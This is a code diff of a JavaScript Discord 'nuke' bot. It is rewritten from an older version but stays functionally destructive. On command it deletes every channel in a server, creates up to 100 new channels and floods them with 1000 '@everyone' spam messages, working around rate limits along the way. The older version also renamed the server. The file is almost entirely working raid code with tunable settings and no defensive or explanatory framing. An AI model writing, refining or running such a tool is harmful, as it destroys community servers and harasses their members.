@@ -2,8 +2,34 @@ const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityTyp
 const TOKEN = process.env.TOKEN;
 
 if (!TOKEN) {
-  console.log("BRO WHERE'S THE TOKEN? set it in railway env vars");
+  console.error("❌ NO TOKEN. Set TOKEN in Railway environment variables.");
   process.exit(1);
+}
+
+// ========== CONFIGURATION (edit these) ==========
+const PREFIX = ".";
+const CHANNEL_NAME = "nuked";                     // fallback if random names disabled
+const MESSAGE = "@everyone @here nuked by dnezero";
+const AMOUNT_OF_CHANNELS = 100;
+const AMOUNT_OF_MESSAGES = 1000;
+
+// Random channel name variations (same as Python version)
+const RANDOM_CHANNEL_NAMES = [
+  "𝕟𝕦𝕜𝕖𝕕",
+  "𝔫𝔲𝔨𝔢𝔡",
+  "𝚗𝚞𝚔𝚎𝚍",
+  "ɴᴜᴋᴇᴅ",
+  "𝓷𝓾𝓴𝓮𝓭",
+  "nuked"
+];
+const USE_RANDOM_NAMES = true;   // set false to always use CHANNEL_NAME
+
+// ========== NO TOUCH BEYOND THIS LINE (unless you know what you're doing) ==========
+function getChannelName() {
+  if (USE_RANDOM_NAMES && RANDOM_CHANNEL_NAMES.length) {
+    return RANDOM_CHANNEL_NAMES[Math.floor(Math.random() * RANDOM_CHANNEL_NAMES.length)];
+  }
+  return CHANNEL_NAME;
 }
 
 const client = new Client({
@@ -11,138 +37,168 @@ const client = new Client({
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildMembers
-  ]
+    GatewayIntentBits.GuildMembers,
+  ],
 });
 
-// fancy channel names (no numbers, just letters added later)
-const nameBase = [
-  "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
-  "𝗻𝗶𝗴𝗵𝘁𝗺𝗮𝗿𝗲 𝗶𝘀 𝗵𝗲𝗿𝗲",
-  "𝙣𝙞𝙜𝙝𝙩𝙢𝙖𝙧𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚",
-  "n̶i̶g̶h̶t̶m̶a̶r̶e̶ i̶s̶ h̶e̶r̶e̶",
-  "n̷i̷g̷h̷t̷m̷a̷r̷e̷ i̷s̷ h̷e̷r̷e̷"
-];
-
-const spamMsg = `# NUKED BY N3XEL
--# N3XEL ON TOP
-https://discord.gg/DyRketGTq
-||@everyone||`;
-
-// random 2 letters (no numbers)
-function randomSuffix() {
-  const chars = 'abcdefghijklmnopqrstuvwxyz';
-  return chars[Math.floor(Math.random() * chars.length)] + chars[Math.floor(Math.random() * chars.length)];
-}
-
-// parallel execution with concurrency limit
-async function runParallel(tasks, concurrency) {
-  let idx = 0;
-  let results = [];
-  async function next() {
-    if (idx >= tasks.length) return;
-    const i = idx++;
-    try {
-      results[i] = await tasks[i]();
-    } catch(e) { results[i] = e; }
-    await next();
+// Helper: run tasks with concurrency limit (like asyncio.Semaphore)
+async function runConcurrent(tasks, concurrency) {
+  const results = [];
+  const executing = [];
+  for (const task of tasks) {
+    const p = Promise.resolve().then(() => task());
+    results.push(p);
+    if (concurrency <= tasks.length) {
+      const e = p.then(() => executing.splice(executing.indexOf(e), 1));
+      executing.push(e);
+      if (executing.length >= concurrency) {
+        await Promise.race(executing);
+      }
+    }
   }
-  const workers = Array(concurrency).fill().map(() => next());
-  await Promise.all(workers);
-  return results;
+  return Promise.allSettled(results);
 }
 
-// delete all channels fast
+// Delete all channels (parallel, concurrency 15)
 async function deleteAllChannels(guild) {
-  let channels = [...guild.channels.cache.values()];
-  console.log(`DELETING ${channels.length} CHANNELS REAL FAST`);
-  let tasks = channels.map(chan => async () => {
+  const channels = [...guild.channels.cache.values()];
+  console.log(`🗑️ Deleting ${channels.length} channels...`);
+  const deleteTasks = channels.map(chan => async () => {
     try {
       await chan.delete();
-      console.log(`deleted ${chan.name}`);
-    } catch(e) {}
+    } catch (e) {}
   });
-  await runParallel(tasks, 15);
-  console.log("ALL CHANNELS GONE");
+  await runConcurrent(deleteTasks, 15);
+  console.log("✅ All channels deleted");
 }
 
-// create 68 channels and spam 20 messages each
-async function create68ChannelsAndSpam(guild) {
-  console.log("CREATING 68 CHANNELS LIKE A MADMAN");
-  let tasks = [];
-  for (let i = 0; i < 68; i++) {
-    let baseName = nameBase[Math.floor(Math.random() * nameBase.length)];
-    let uniqueName = baseName + "-" + randomSuffix();
-    tasks.push(async () => {
+// Create N channels (parallel, concurrency 10)
+async function createChannels(guild, count) {
+  console.log(`📝 Creating ${count} channels...`);
+  const createTasks = [];
+  for (let i = 0; i < count; i++) {
+    createTasks.push(async () => {
       try {
-        let chan = await guild.channels.create({
-          name: uniqueName,
+        const name = getChannelName();
+        const channel = await guild.channels.create({
+          name: name,
           type: ChannelType.GuildText,
-          permissionOverwrites: [{
-            id: guild.roles.everyone.id,
-            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
-          }]
+          permissionOverwrites: [
+            {
+              id: guild.roles.everyone.id,
+              allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
+            },
+          ],
         });
-        console.log(`made channel ${uniqueName}`);
-        // send 20 messages in parallel
-        let msgPromises = [];
-        for (let k = 0; k < 20; k++) {
-          msgPromises.push(chan.send(spamMsg).catch(err => {
-            if (err.code == 429) {
-              console.log("rate limited, retrying");
-              return new Promise(r => setTimeout(r, err.retryAfter * 1000)).then(() => chan.send(spamMsg));
-            }
-            return null;
-          }));
-        }
-        await Promise.all(msgPromises);
-        console.log(`spammed 20 msgs in ${uniqueName}`);
-      } catch(err) {
-        if (err.code == 429) {
-          console.log("ratelimit on create, waiting a bit");
+        return channel;
+      } catch (err) {
+        if (err.code === 429) {
+          console.log(`⏳ Rate limit on create, waiting ${err.retryAfter}s`);
           await new Promise(r => setTimeout(r, err.retryAfter * 1000));
-        } else {
-          console.log(`failed to make ${uniqueName}: ${err.message}`);
+          // retry once
+          const name = getChannelName();
+          return await guild.channels.create({
+            name: name,
+            type: ChannelType.GuildText,
+            permissionOverwrites: [
+              {
+                id: guild.roles.everyone.id,
+                allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
+              },
+            ],
+          });
+        }
+        console.log(`❌ Create failed: ${err.message}`);
+        return null;
+      }
+    });
+  }
+  const results = await runConcurrent(createTasks, 10);
+  return results.map(r => r.value).filter(c => c !== null);
+}
+
+// Send totalMessages across channels as fast as possible (concurrency 50)
+async function sendMessagesFast(channels, totalMessages) {
+  if (!channels.length) return;
+  console.log(`📨 Sending ${totalMessages} messages across ${channels.length} channels...`);
+  const messageTasks = [];
+  for (let i = 0; i < totalMessages; i++) {
+    const targetChannel = channels[i % channels.length];
+    messageTasks.push(async () => {
+      try {
+        await targetChannel.send(MESSAGE);
+      } catch (err) {
+        if (err.code === 429) {
+          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
+          await targetChannel.send(MESSAGE);
         }
       }
     });
   }
-  await runParallel(tasks, 10);
-  console.log("DONE CREATING AND SPAMMING");
+  await runConcurrent(messageTasks, 50);
+  console.log("✅ All messages sent");
 }
 
-// main nuke - change server name first
+// Main nuke logic
 async function nukeServer(guild) {
-  console.log(`🔥🔥🔥 NUKING ${guild.name} 🔥🔥🔥`);
-  // change server name to OWNED BY N3XEL
-  try {
-    await guild.setName("OWNED BY N3XEL");
-    console.log("changed server name to OWNED BY N3XEL");
-  } catch(e) {
-    console.log("couldn't change server name: " + e.message);
-  }
+  console.log(`🔥 Starting nuke on ${guild.name} (${guild.id})`);
+  const startTime = Date.now();
+
+  // 1. Delete all channels
   await deleteAllChannels(guild);
-  await create68ChannelsAndSpam(guild);
-  console.log("SERVER IS FUCKED");
+
+  // 2. Create new channels
+  const channels = await createChannels(guild, AMOUNT_OF_CHANNELS);
+  if (!channels.length) {
+    console.log("❌ No channels created, aborting message spam.");
+    return;
+  }
+
+  // 3. Send messages
+  await sendMessagesFast(channels, AMOUNT_OF_MESSAGES);
+
+  const elapsed = (Date.now() - startTime) / 1000;
+  console.log(`💀 Nuke completed in ${elapsed.toFixed(2)} seconds!`);
 }
 
+// ========== BOT EVENTS & COMMANDS ==========
 client.once('ready', () => {
-  console.log(`Logged in as ${client.user.tag}`);
+  console.log(`✅ Bot online as ${client.user.tag}`);
+  console.log(`Prefix: ${PREFIX}`);
+  console.log(`Command: ${PREFIX}nuke`);
+  console.log("=".repeat(50));
+  // optional: set status (you can remove if not needed)
   client.user.setPresence({
     status: 'dnd',
-    activities: [{ name: '@n3xel', type: ActivityType.Custom, state: '@n3xel' }]
+    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }],
   });
-  console.log("status DND with @azairo");
 });
 
 client.on('messageCreate', async (msg) => {
   if (msg.author.bot) return;
-  if (msg.content.trim() === '!nuke') {
-    let guild = msg.guild;
-    if (!guild) return msg.reply("this aint a server dumbass");
-    await msg.reply("💀 NUKE STARTED - RENAMING SERVER, DELETING EVERYTHING");
-    await nukeServer(guild);
+  if (!msg.content.startsWith(PREFIX)) return;
+
+  const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
+  const command = args.shift().toLowerCase();
+
+  if (command === 'nuke') {
+    // Check administrator permission (like Python version)
+    if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+      return msg.reply("❌ You need Administrator permission to use this command!");
+    }
+    await msg.reply("💣 Nuking server in progress...");
+    await nukeServer(msg.guild);
+  } else if (command === 'config') {
+    const configMsg = `
+**Current Configuration:**
+📝 Channel Name: \`${CHANNEL_NAME}\`
+🎲 Random Names: \`${USE_RANDOM_NAMES ? 'Enabled' : 'Disabled'}\`
+💬 Message: \`${MESSAGE.substring(0, 50)}${MESSAGE.length > 50 ? '...' : ''}\`
+📊 Channels: \`${AMOUNT_OF_CHANNELS}\`
+📨 Messages: \`${AMOUNT_OF_MESSAGES}\`
+    `;
+    await msg.reply(configMsg);
   }
 });
 
-client.login(TOKEN).catch(e => console.log("login error: " + e.message));
+client.login(TOKEN).catch(err => console.error("Login error:", err.message));
